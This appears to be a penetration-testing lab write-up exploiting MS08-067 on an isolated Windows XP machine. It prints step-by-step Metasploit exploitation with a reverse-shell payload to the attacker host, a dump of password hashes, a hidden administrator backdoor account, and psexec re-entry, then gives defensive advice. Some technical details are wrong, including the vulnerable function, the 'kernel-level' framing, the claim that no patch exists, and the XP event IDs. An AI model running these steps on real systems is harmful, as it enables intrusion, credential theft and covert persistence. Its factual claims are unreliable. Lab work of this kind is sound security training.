# Ethical Hacking Lab 4: Windows XP — MS08-067 Remote Exploitation & Persistence

**Part of:** Comprehensive Penetration Testing Lab Series  
**Date:** July 2026  
**Skill Level:** Intermediate (follows Labs 1-3)

---

## Objective

Exploit a **kernel-level remote code execution vulnerability** in a legacy Windows XP SP3 system via SMB (MS08-067), achieve SYSTEM-level access, and establish persistent backdoor access that survives system reboots.

---

## Lab Environment

| Component | Specification |
|---|---|
| Hypervisor | VMware Workstation |
| Network | Custom virtual network (VMnet8), `192.168.108.0/24` — Isolated, no internet |
| Attacker | Kali Linux (Rolling) — `192.168.108.128` |
| Target | Windows XP SP3 x86 — `192.168.108.132` |
| Tools | Metasploit Framework 6.4.135-dev, msfvenom, Meterpreter, cmd.exe shell |

---

## Lab 4: Windows XP SP3 — MS08-067 Remote Kernel Exploitation & Persistence

### Achievement ✅

#### Reconnaissance

```bash
nmap -sV -O -p 445,139,135 192.168.108.132
```

**Output:**
```
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows XP
OS: Windows XP Service Pack 3 (build 2600) x86
```

#### Vulnerability Confirmation

```bash
nmap --script smb-vuln-ms08-067 -p 445 192.168.108.132
```

**Output:**
```
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Remote Code Execution in Server Service (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|_      Risk factor: HIGH (CVSS 8.3)
```

#### Exploitation

**Metasploit Configuration:**
```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.108.132
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.108.128
set LPORT 4444
set SMBPIPE BROWSER
exploit
```

**Execution Timeline:**
```
[*] 192.168.108.132:445 - Attempting to trigger the vulnerability...
[*] Sending stage (199238 bytes) to 192.168.108.132
[*] Meterpreter session 1 opened (192.168.108.128:4444 -> 192.168.108.132:1041)
meterpreter >
```

#### Post-Exploitation Verification

**Session Access:**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**System Information:**
```
meterpreter > sysinfo
Computer        : CLIENTXP
OS              : Windows XP (5.1 Build 2600, Service Pack 3)
Architecture    : x86
System Language : en_US
Domain          : MSHOME
Logged On Users : 2
```

**Credential Harvesting:**
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
client:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:307521ab01560c5f4f08ba24bc4da7ae:6928ec8a23f43ab6ea3de2091ee6031e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:a500e5a50f99c5b078728f8025c25ff9:::
```

---

## Technical Details of MS08-067

| Aspect | Details |
|---|---|
| **CVE** | CVE-2008-4250 |
| **Vulnerability** | Integer overflow in `SrvOs2FeaListSizeToNt()` within `srv.sys` (SMB service driver) |
| **Attack Vector** | Crafted RPC request with malformed path specification during path canonicalization |
| **Impact** | Stack-based buffer overflow → kernel-mode code execution (SYSTEM privilege) |
| **Root Cause** | Path canonicalization fails to validate path length, leading to overflow into kernel stack |
| **Exploitation Method** | Metasploit sends specially crafted SMB packets that overflow the buffer and overwrite return addresses |
| **CVSS Score** | 8.3 (High) |
| **Affected Versions** | Windows 2000 SP4, XP SP2/SP3, 2003 SP1/SP2, Vista SP1/SP2, 2008 (pre-patch) |

---

## Persistence — Creating Backdoor Account

### Why Persistence Matters

The Meterpreter session is **temporary**. If the system crashes, reboots, or the attacker's connection drops, access is lost. **Persistence transforms a temporary foothold into permanent access** that survives indefinitely.

### Creating the Backdoor

From the SYSTEM shell:

```
meterpreter > shell
Process 456 created.
Channel 1 created.
C:\WINDOWS\system32>
```

**Step 1: Create Local User Account**
```batch
C:\WINDOWS\system32>net user backdoor P@ssw0rd123 /add
The command completed successfully.
```

**Step 2: Add to Local Administrators Group**
```batch
C:\WINDOWS\system32>net localgroup administrators backdoor /add
The command completed successfully.
```

**Step 3: Hide from Login Screen (Optional but Operational)**
```batch
C:\WINDOWS\system32>reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
The operation completed successfully.
```

This registry key removes the account from the login UI while **keeping the account fully functional**.

**Step 4: Verification**
```batch
C:\WINDOWS\system32>net user backdoor
User name                    backdoor
Account active               Yes
Account expires              Never
Password last set            7/12/2026 2:52 AM
Local Group Memberships      *Administrators  *Users
```

### Persistence Mechanism Breakdown

| Step | Command | Purpose | Survives Reboot? |
|---|---|---|---|
| Account Creation | `net user backdoor P@ssw0rd123 /add` | Create local user with password | ✅ Yes (SAM database) |
| Privilege Escalation | `net localgroup administrators backdoor /add` | Grant admin rights | ✅ Yes (SAM database) |
| Hide from UI | Registry: `UserList = 0` | Remove from login screen (stealth) | ✅ Yes (Registry) |
| Test Access | Remote login attempt | Verify account works | ✅ Yes |

**Where it's stored:**
- Account data: `%SystemRoot%\System32\config\SAM` (Security Account Manager hive)
- Registry key: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList`
- Both survive system reboots indefinitely

### Regaining Access (If Original Session Dies)

Even if the Meterpreter session crashes or the attacker disconnects, the backdoor persists:

**Via psexec (Python impacket):**
```bash
psexec.py -u backdoor -p "P@ssw0rd123" 192.168.108.132 cmd.exe
```

**Via Metasploit psexec:**
```
use exploit/windows/smb/psexec
set RHOSTS 192.168.108.132
set SMBUser backdoor
set SMBPass P@ssw0rd123
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.108.128
set LPORT 4445  # Different port for second session
exploit
```

**Result:** Attacker regains SYSTEM-level access instantly, without needing the original vulnerability.

---

## Why This Lab Matters

### Legacy Systems Are Still a Threat

Windows XP reached end-of-support in **April 2014** — over 12 years ago. Yet:

1. **MS08-067 still works** — No patches available; users who didn't update before EOL remain vulnerable
2. **Real-world presence** — XP systems still exist in hospitals, industrial control systems, government agencies, and ATM networks
3. **Attack feasibility** — A single misconfiguration (like this isolated lab being bridged to a network) turns a dormant system into a critical liability
4. **Persistence is the endgame** — Exploiting the vulnerability is step 1; establishing permanent access is step 2 (and more valuable to attackers)

### Key Insight

**Persistence transforms a temporary foothold into permanent access.** The MS08-067 exploit may crash the SMB service or system (inherent to buffer overflow exploits), but the backdoor account survives indefinitely. Professional attackers don't rely on a single shell — they establish multiple persistence mechanisms. This is why legacy systems aren't secure "if air-gapped" — they're only secure if truly isolated; one misconfiguration is enough.

---

## Defensive Implications

### Detection

**Registry Artifacts:**
```powershell
Get-ChildItem -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
```
Any non-default entries are suspicious.

**Account Auditing:**
```bash
# Windows Event Viewer: Security Log
# Event ID 4720 (User Account Created)
# Event ID 4732 (Member added to local group)
# Event ID 4738 (User Account Modified)
```

**Live Detection:**
```bash
# Check all local accounts
net user

# Check members of Administrators group
net localgroup administrators
```

### Prevention

For legacy systems that can't be replaced:

1. **Disable SMBv1** (Windows XP: register key: `HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters`)
2. **Restrict inbound ports 139/445** at firewall level
3. **Monitor for reboots** (unusual activity after maintenance)
4. **Disable blank passwords** and enforce strong passwords
5. **Implement application whitelisting** (AppLocker / Software Restriction Policies)
6. **Segment network** — air-gap XP systems from general network traffic

---

## Reproducibility

### Prerequisites

- VMware Workstation with custom virtual network `VMnet8` (192.168.108.0/24) isolated from internet
- Kali Linux VM with Metasploit Framework installed
- Windows XP SP3 VM with static IP `192.168.108.132`
- Both VMs on `VMnet8` custom network

### Step-by-Step Reproduction

**1. Reconnaissance (Kali):**
```bash
nmap -sV -O -p 445,139,135 192.168.108.132
nmap --script smb-vuln-ms08-067 -p 445 192.168.108.132
```

**2. Start Metasploit Multi-Handler (Kali):**
```bash
msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.108.128
set LPORT 4444
run
```

**3. Run Exploit (Kali — new terminal):**
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.108.132
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.108.128
set LPORT 4444
set SMBPIPE BROWSER
exploit
```

**4. Verify Session & Harvest Hashes:**
```
meterpreter > getuid
meterpreter > hashdump
```

**5. Create Persistence (SYSTEM shell):**
```
meterpreter > shell
C:\WINDOWS\system32> net user backdoor P@ssw0rd123 /add
C:\WINDOWS\system32> net localgroup administrators backdoor /add
```

**6. Test Persistence (From attacker machine):**
```bash
psexec.py -u backdoor -p "P@ssw0rd123" 192.168.108.132 cmd.exe
```

---

## References

- **CVE-2008-4250:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
- **Metasploit Module:** `exploit/windows/smb/ms08_067_netapi`
- **Microsoft Security Bulletin:** MS08-067
- **NIST NVD:** https://nvd.nist.gov/vuln/detail/CVE-2008-4250

---

## Legal Disclaimer

*All activity documented in this report was performed exclusively against self-owned virtual machines in an isolated lab environment with no external network connectivity. No production systems, third-party networks, or public infrastructure were involved. This lab was created for educational purposes to understand penetration testing methodology and defensive measures.*

*Disclaimer: These techniques should only be practiced in authorized, isolated lab environments. Unauthorized access to computer systems is illegal.*

*Last updated: July 2026*
